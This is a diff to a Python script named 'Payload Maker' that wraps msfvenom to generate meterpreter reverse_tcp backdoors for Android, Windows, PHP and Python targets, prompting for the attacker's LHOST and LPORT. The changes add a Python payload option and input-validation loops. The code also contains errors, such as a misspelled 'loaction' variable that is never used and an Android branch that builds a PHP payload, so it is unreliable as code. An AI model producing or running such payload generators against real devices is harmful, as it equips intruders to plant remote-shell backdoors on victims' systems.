@@ -1,4 +1,6 @@
 import sys
+import os
+import time
 def platform1():
     platforms = {
         'linux1' : 'Linux',
@@ -18,115 +20,119 @@ else:
 if sys.version_info.major < 3:
 	print("Payload Maker supports only Python3. Rerun application in Python3 environment.")
 	install = input("you want to install Python3? [yes / no] : ")
-	if intall.lower()=="yes" or install.lower()=="y":
+	if install.lower()=="yes" or install.lower()=="y":
 		os.system("sudo apt update && sudo apt-get install python")
-import os
-option=["1","2","3","99","exit"]
+	else:
+		sys.exit()
+		print("Program Exiting.......")
+		time.sleep(1)
+		sys.exit()
+else:
+	pass
+option=["1","2","3","4","99","exit"]
 def payload():
 	print("(1)Make Paylaod for Android.")
 	print("(2)Make Payload for Windows.")
 	print("(3)Make PHP Payload.")
+	print("(4)Make Python Payload for Linux.")
 	print("(99)Exit.")
-	platform=input("Answer : ")
-	if platform in option:
-		pass
-	else:
-		print("Please type correct option.")
+	while True:
 		platform=input("Answer : ")
-	if platform in option:
-    		pass
-	else:
-		print("Please type correct option.")
-		platform=input("Answer : ")
-	if platform in option:
-    		pass
-	else:
-		print("Please type correct option.")
-		platform=input("Answer : ")
-	if platform in option:
-    		pass
-	else:
-		print("Please type correct option.")
-		platform=input("Answer : ")
-	if platform in option:
-    		pass
-	else:
-		print("Please type correct option.")
-		platform=input("Answer : ")
-	if platform in option:
-    		pass
-	else:
-		print("Please type correct option.")
-		platform=input("Answer : ")
-	if platform in option:
-    		pass
-	else:
-		print("Please type correct option.")
-		platform=input("Answer : ")
-	if platform in option:
-    		pass
-	else:
-		print("Sorry you can't use this software.")
-		sys.exit
+		if platform =="99" or platform.lower()=="exit":
+    			print("Program Exiting.......")
+    			time.sleep(1)
+    			sys.exit()
+		elif platform in option:
+			break
+		else:
+			print(f"Error : {platform} not found. \nPlease type correct option.")
+			continue
 	os.system("ifconfig")
+	lhost=""
 	while True:
 		lhost=input("Type your localhost show in display i.e 192.168.10.1 : ")
 		if lhost:
-			while True:
-				lport=input("Type localport i.e 4444 : ")
-				if lport:
-					name=input("Type the name of your payload i.e payload.apk/.exe/.php : ")
-					if name:
-						location=input("Type location of your payload i.e /root/Desktop.. : ")
-						if location:
-							break
-						else:
-							location = (f"/root/Desktop/{name}")
-							print("your payload save will in your desktop.")
-							break
-					else:
-						name="payload"
-						break
-					
-				else:
-					print("localport is important! Please type your localport.")
-					continue
-			break
-					
+ 				break 
 		else:
-			print("localhost is important! Please type your localhost.")
-			continue
-	if platform=="1":
-		if ".apk" not in name:
-			name=name+".apk"
-		os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={int(lport)} > {location}")
-		if platform=="2":
-			if ".exe" not in name:
-				name=name+".exe"
-			else:
-				name=name
-		os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={lhost} lport={int(lport)} > {location}")
-		if platform=="3":
-			if ".php" not in name:
-				name=name+".php"
-			else:
-				name=name
-		os.system(f"msfvenom -p php/meterpreter/reverse_tcp lhost={lhost} lport={int(lport)} > {location}")
-		if platform=="99" :
-			sys.exit()
-		else:
-			print("Please type correct option")
-			sys.exit()
-			
-try:		
+    			print("Please type your LHOST(LocalHost) which show in display.")
+    			continue
 	while True:
-		ans=input("You want to make payload for windows, android phone or php payload [yes / no]: ")
-		if ans.lower()=="yes" or ans.lower()=="y":
-			payload()	
-			break
-		elif ans.lower()=="no" or ans.lower()=="n":
-			sys.exit()
-except UnboundLocalError:
-	pass
+    		lport=input("Type localport i.e 4444 : ")
+    		if lport:
+    				break
+    		else:
+    				print("Please type your LPORT(LocalPort).")
+    				continue
+	while True:
+			name=input("Type the name of your payload i.e payload.apk/.exe/.php/.py : ")
+			if name:
+    				break
+			else:
+    				print("Please type the name of your Payload(BackDoor).")
+    				continue
+	while True:
+    		location=input("Type location of your payload i.e /root/Desktop.. : ")
+    		if location:
+    				if "/" in location or "\\" in location:
+    						break
+    				else:
+    						print(f"Error:{location} not found.\nPlease type correct location.")
+    		else:
+    				loaction = "/root/Desktop/"
+    				print("Your did not type any thing in the place of loacation.\nThat's Your payload save in your Desktop.")
+    				break
+	if platform=="1":
+			if ".apk" not in name:
+					name=name+".apk"
+					loaction = loaction+name
+					print("Creating payload.........")
+					os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
+			else:
+    				print("Creating payload.........")
+    				loaction = loaction+name
+    				os.system(f"msfvenom -p php/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
+	elif platform=="2":
+			if ".exe" not in name:
+					name=name+".exe"
+					loaction = loaction+name
+					print("Creating payload.........")
+					os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
+			else:
+					name=name
+					loaction = loaction+name
+					os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
+					print("Creating payload.........")
+	elif platform=="3":
+			if ".php" not in name:
+					name=name+".php"
+					loaction = loaction+name
+					os.system(f"msfvenom -p php/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
+			else:
+    				loaction = loaction+name
+    				print("Creating payload.........")
+    				os.system(f"msfvenom -p php/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
+	elif platform=="4":
+			if ".py" not in name:
+    				name=name+".py"
+    				loaction = loaction+name
+    				print("Creating payload.........")
+    				os.system(f"msfvenom -p python/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
+			else:
+    				loaction = loaction+name
+    				print("Creating payload.........")
+    				os.system(f"msfvenom -p python/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
+	elif platform=="99" or platform == "exit" :
+				sys.exit()
+try:		
+	print("""
+##################################
+#         Payload-Maker          #
+#       Author: Moin Khan        #
+##################################
+					""")
+	payload()	
+		
+except Exception as e:
+	print(e)
 	
 
